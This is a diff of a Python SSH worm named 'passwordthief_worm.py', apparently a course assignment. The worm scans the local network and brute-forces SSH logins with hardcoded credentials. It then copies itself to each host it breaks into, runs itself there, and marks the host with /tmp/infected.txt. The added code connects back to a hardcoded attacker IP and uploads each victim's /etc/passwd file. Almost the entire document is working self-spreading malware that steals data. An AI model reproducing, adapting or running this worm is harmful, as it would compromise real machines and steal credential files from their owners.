@@ -16,25 +16,13 @@ credList = [
 ('cpsc', 'cpsc'),
 ]
 
-HostIP=[]
+ORIGIN_IP = "192.168.1.3"
+ATTACKER_USER_NAME ="cpsc"
+ATTACKER_PASSWORD = "cpsc"
+
 # The file marking whether the worm should spread
 INFECTED_MARKER_FILE = "/tmp/infected.txt"
 
-
-
-def getpasswordback(sshClient,HostIp,host):
-
-		print("***************getting Password***********")
-		print("start to copy")
-		#copy attack system
-		sftpClient = sshClient.open_sftp()
-		remotepath = '/etc/passwd'
-		localpath = '/home/passwd_'+host
-		print(host)
-		sftpClient.get(remotepath, localpath)
-		#make this system as getting the input
-		sftpClient.put("/tmp/GotPassword.txt","/tmp/GotPassword.txt")
-		
 ##################################################################
 # Returns whether the worm should spread
 # @return - True if the infection succeeded and false otherwise
@@ -69,8 +57,6 @@ def markInfected():
 	infect.write("system has been infect")
 	infect.close()
 
-	
-
 ###############################################################
 # Spread to the other system and execute
 # @param sshClient - the instance of the SSH client connected
@@ -95,21 +81,15 @@ def spreadAndExecute(sshClient,systemIP1):
 	
 	print("****************inside the spreadAndExecute***********")
 	# MIG: Changed this one to the SFTP client
-	if len(sys.argv) < 2:
+
+	if systemIP1 != ORIGIN_IP:
 		sftpClient.put("/tmp/passwordthief_worm.py","/tmp/passwordthief_worm.py")
-
-
 	else:
 		sftpClient.put("passwordthief_worm.py","/tmp/passwordthief_worm.py")
 
 
 	sshClient.exec_command("chmod a+x /tmp/passwordthief_worm.py")
-	sshClient.exec_command("python /tmp/passwordthief_worm.py")
-	pass
-
-	
-	
-	
+	sshClient.exec_command("python /tmp/passwordthief_worm.py 2> /tmp/log.txt")
 	
 
 ############################################################
@@ -150,8 +130,6 @@ def tryCredentials(inHost, userName, password, sshClient):
 	try:
 		sshClient.connect(inHost, username = userName, password = password)
 		print("Got him!", inHost,userName, password)
-		HostIP.append(inHost)
-		print(HostIP)
 		return 0
 	# MIG: Removed this
 	#return 1 if wrong credentials
@@ -269,6 +247,12 @@ def getHostsOnTheSameNetwork():
 			liveHosts.append(host)
 	return liveHosts
 
+# TODO: Get the IP of the current system
+interface = netifaces.interfaces()
+
+systemIP = getMyIP(interface)
+print("System IP is " + systemIP)
+
 # If we are being run without a command line parameters, 
 # then we assume we are executing on a victim system and
 # will act maliciously. This way, when you initially run the 
@@ -278,8 +262,10 @@ def getHostsOnTheSameNetwork():
 # an alternative approach is to hardcode the origin system's
 # IP address and have the worm check the IP of the current
 # system against the hardcoded IP. 
-if len(sys.argv) < 2:
-	
+if systemIP == ORIGIN_IP:
+	print("It does")
+if systemIP != ORIGIN_IP:
+
 	# TODO: If we are running on the victim, check if 
 	# the victim was already infected. If so, terminate.
 	# Otherwise, proceed with malice. 
@@ -290,12 +276,33 @@ if len(sys.argv) < 2:
 	# Let's mark it.
 	else:
 		markInfected()
-	
-# TODO: Get the IP of the current system
-interface = netifaces.interfaces()
 
-systemIP = getMyIP(interface)
-print("System IP is " + systemIP)
+		# MIG2 Added this:############################################
+		
+		# Create an instance of the SSH client
+		sshBack = paramiko.SSHClient()
+
+		# Set some parameters to make things easier.
+		sshBack.set_missing_host_key_policy(paramiko.AutoAddPolicy())
+	
+		try:
+			# Connect back to the attacker
+			sshBack.connect(ORIGIN_IP, username = ATTACKER_USER_NAME, password = ATTACKER_PASSWORD)
+		
+			# Open the connection back to the attacker
+			sftpBack = sshBack.open_sftp()
+		
+				
+			# The paths
+			localpath = '/etc/passwd'
+			remotepath = '/tmp/passwd' + systemIP
+		
+			# Upload the password file
+			sftpBack.put(localpath, remotepath)
+
+		
+		except:
+			print "Could not connect back to the attacker!"
 
 # Get the hosts on the same network
 networkHosts = getHostsOnTheSameNetwork()
@@ -310,9 +317,11 @@ attackList = []
 temp = []
 
 for targetHost,j in enumerate(networkHosts):
-	if networkHosts[targetHost] != systemIP:
+	if networkHosts[targetHost] != systemIP and networkHosts[targetHost] != ORIGIN_IP:
 		attackList.append(networkHosts[targetHost])
-print "Found Hosts to attack: ", attackList
+	#Try to attack this host
+print "Found hosts: To attack", attackList
+
 
 # Go through the network hosts
 for host in attackList:
@@ -321,7 +330,6 @@ for host in attackList:
 	sshInfo =  attackSystem(host)
 	
 	print sshInfo
-	
 	
 	# Did the attack succeed?
 	if sshInfo:
@@ -364,9 +372,7 @@ for host in attackList:
 		# To do that, you need an instance of the sftp client. 
 		# not SSH.
 		sftpClient = sshInfo[0].open_sftp()
-
-
-
+		
 		try:
 			# MIG: Check if the /tmp/infected.txt file
 			# already exists at the remote system.
@@ -375,16 +381,12 @@ for host in attackList:
 			sftpClient.stat("/tmp/infected.txt")
 			print "The remote system ", sshInfo,  " already contains the infected.txt file"
 		except:
+			print("We are going to spread ")
+			spreadAndExecute(sshInfo[0], systemIP)
 			
-				
-				print("inside if isInfectedSytem() statement ")
-				spreadAndExecute(sshInfo[0],HostIP)
-				print("done infecting")
-		try:
-				sftpClient.stat("/tmp/GotPassword.txt")
-		except:
-				print("We are getting it"+host )
-				getpasswordback(sshInfo[0],HostIP,host)
+			# MIG: If we just infected the system, we should
+			# exit.
+			exit(1)
 
-			
+
 
